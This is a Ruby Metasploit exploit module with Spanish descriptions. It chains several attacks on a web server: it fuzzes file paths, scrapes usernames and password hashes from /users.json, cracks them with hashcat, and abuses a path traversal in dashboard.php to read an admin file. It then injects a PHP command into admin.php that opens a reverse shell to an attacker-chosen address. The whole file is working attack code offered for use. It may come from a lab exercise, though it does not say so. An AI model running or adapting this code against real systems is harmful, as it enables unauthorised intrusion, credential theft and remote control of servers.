require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Fuzz and Exploit Script',
      'Description' => %q{
        Este módulo realiza fuzzing, extracción de datos sensibles y explotación de un servidor web.
      },
      'Author'      => [ 'Alejandro Meléndez Uriz & Ander Monreal Ayanz' ],
      'License'     => MSF_LICENSE,
      'Targets'     => [
        [ 'Automatic Targeting', {} ]
      ],
      'DefaultTarget' => 0
    ))

    register_options(
      [
        OptString.new('RHOST', [true, 'Host objetivo', '127.0.0.1']),
        OptInt.new('RPORT', [true, 'Puerto objetivo', 8080]),
        OptString.new('FILE_LIST', [true, 'Archivo con nombres de archivos', 'web_contents_dir.txt']),
        OptString.new('PASSWORD_LIST', [true, 'Archivo con lista de contraseñas', 'passwords_dir.txt']),
        OptString.new('REVERSE_IP', [true, 'IP para la reverse shell', '']),
        OptInt.new('REVERSE_PORT', [true, 'Puerto para la reverse shell', 4444])
      ]
    )
  end

  def fuzz_files
    file_list = File.readlines(datastore['FILE_LIST']).map(&:strip)
    valid_files = []

    print_status("Iniciando fuzzing en #{datastore['RHOST']}:#{datastore['RPORT']}")

    file_list.each do |file|
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => "/#{file}"
      })
      if res && res.code != 404
        print_good("Archivo válido encontrado: #{file}")
        valid_files << file
      end
    end

    File.write('valid_files.txt', valid_files.join("\n"))
    print_status("Fuzzing completado. Archivos guardados en valid_files.txt")
  end

  def extract_credentials
    print_status("Extrayendo datos de usuarios...")

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => "/users.json"
    })

    if res && res.body
      users = res.body.scan(/"username":\s*"([^"]*)"/).flatten
      passwords = res.body.scan(/"password":\s*"([^"]*)"/).flatten

      credentials = users.zip(passwords).map { |u, p| "#{u}:#{p}" }
      File.write('credentials.txt', credentials.join("\n"))

      print_good("Credenciales encontradas: #{credentials.join(', ')}")
    else
      print_error("No se pudo acceder a /users.json")
    end
  end

  def validate_passwords
    print_status("Validando contraseñas con Hashcat...")

    system("hashcat -m 100 -a 0 --show hashes.txt #{datastore['PASSWORD_LIST']} --outfile valid_credentials.txt > /dev/null 2>&1")

    valid_hashes = File.readlines('valid_credentials.txt').map(&:strip)

    valid_users = []
    File.foreach('credentials.txt') do |line|
      username, hash = line.split(':')
      valid_hashes.each do |valid_line|
        valid_hash, plain_password = valid_line.split(':')
        if hash == valid_hash
          valid_users << "#{username}:#{plain_password}"
        end
      end
    end

    File.write('valid_users.txt', valid_users.join("\n"))
    print_good("Usuarios válidos: #{valid_users.join(', ')}")
  end

  def exploit_path_traversal
    print_status("Explotando path traversal...")

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => "/dashboard.php",
      'vars_get' => { 'dir' => '.' }
    })

    if res && (admin_file = res.body.match(/admins.*?\.json/))
      admin_file_path = admin_file[0]
      print_good("Archivo admin encontrado: #{admin_file_path}")

      res = send_request_cgi({
        'method' => 'GET',
        'uri' => "/#{admin_file_path}"
      })

      if res && res.body
        print_good("Contenido del archivo admin:")
        print_line(res.body)
      else
        print_error("No se pudo acceder al archivo admin.")
      end
    else
      print_error("No se pudo encontrar archivo admin")
    end
  end

  def inject_reverse_shell
    print_status("Inyectando reverse shell...")

    payload = "$(php -r '\\$sock=fsockopen(\"#{datastore['REVERSE_IP']}\",#{datastore['REVERSE_PORT']});exec(\"/bin/sh -i <&3 >&3 2>&3\");')"

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => "/admin.php",
      'vars_post' => {
        'username' => 'test',
        'email' => 'test@example.com',
        'payload' => payload,
        'password' => 'securepassword',
        'submit' => 'Save+New+User'
      }
    })

    if res && res.code == 200
      print_good("Payload enviado con éxito.")
    else
      print_error("Error al enviar el payload.")
    end
  end

  def run
    fuzz_files
    extract_credentials
    validate_passwords
    exploit_path_traversal
    inject_reverse_shell
  end
end
